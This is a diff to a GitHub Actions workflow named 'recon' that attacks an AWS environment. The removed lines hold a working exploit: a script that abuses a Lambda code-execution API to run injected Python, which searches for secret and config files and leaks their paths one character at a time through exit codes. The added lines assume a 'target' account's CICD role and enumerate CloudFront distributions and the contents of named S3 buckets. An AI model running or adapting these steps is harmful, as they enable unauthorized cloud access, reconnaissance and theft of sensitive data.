@@ -7,116 +7,37 @@ on:
 
 permissions:
   contents: read
+  id-token: write
 
 jobs:
   recon:
     runs-on: ubuntu-latest
 
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
-      AWS_DEFAULT_REGION: us-east-1
-
     steps:
-      - name: Map Lambda files
+      - name: Assume target CICD role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Verify target account
         run: |
-          pip install boto3 requests requests-aws4auth --quiet
+          aws sts get-caller-identity
 
-          cat > /tmp/map_files.py <<'PY'
-          import base64
-          import re
-          import textwrap
-          import requests
-          import boto3
-          from requests_aws4auth import AWS4Auth
+      - name: List CloudFront distributions
+        run: |
+          aws cloudfront list-distributions \
+            --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origins:Origins.Items[].DomainName}' \
+            --output json
 
-          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
+      - name: Test target buckets
+        run: |
+          aws s3api list-objects-v2 \
+            --bucket userad88e2b168aa387e \
+            --max-items 5 \
+            --output json
 
-          credentials = boto3.Session().get_credentials().get_frozen_credentials()
-
-          auth = AWS4Auth(
-              credentials.access_key,
-              credentials.secret_key,
-              "us-east-1",
-              "execute-api",
-              session_token=credentials.token,
-          )
-
-          lambda_template = """
-          import os
-
-          hits = []
-
-          for root in ["/var/task", "/opt"]:
-              for path, directories, files in os.walk(root):
-                  directories[:] = directories[:100]
-
-                  for name in files:
-                      lower_name = name.lower()
-
-                      if any(word in lower_name for word in [
-                          "aws",
-                          "lambda",
-                          "s3",
-                          "config",
-                          "policy",
-                          "secret",
-                          "user",
-                          "json",
-                          "py",
-                          "txt",
-                      ]):
-                          hits.append(os.path.join(path, name))
-
-          target = "\\n".join(sorted(hits))
-          index = __INDEX__
-
-          if index >= len(target):
-              raise SystemExit(255)
-
-          raise SystemExit(ord(target[index]))
-          """
-
-          lambda_template = textwrap.dedent(lambda_template)
-          output = []
-
-          for index in range(256):
-              lambda_code = lambda_template.replace(
-                  "__INDEX__",
-                  str(index),
-              )
-
-              encoded_code = base64.b64encode(
-                  lambda_code.encode()
-              ).decode()
-
-              response = requests.post(
-                  API,
-                  json={"code": encoded_code},
-                  auth=auth,
-                  timeout=30,
-              )
-
-              match = re.search(
-                  r"exit status (\\d+)",
-                  response.text,
-              )
-
-              if not match:
-                  print("NO_EXIT_CODE:", index)
-                  print(response.text)
-                  break
-
-              value = int(match.group(1))
-
-              if value == 255:
-                  break
-
-              output.append(chr(value))
-
-          print("LAMBDA_FILE_PATHS:")
-          print("".join(output))
-          PY
-
-          python3 /tmp/map_files.py
+          aws s3api list-objects-v2 \
+            --bucket logad88e2b168aa387e \
+            --max-items 5 \
+            --output json
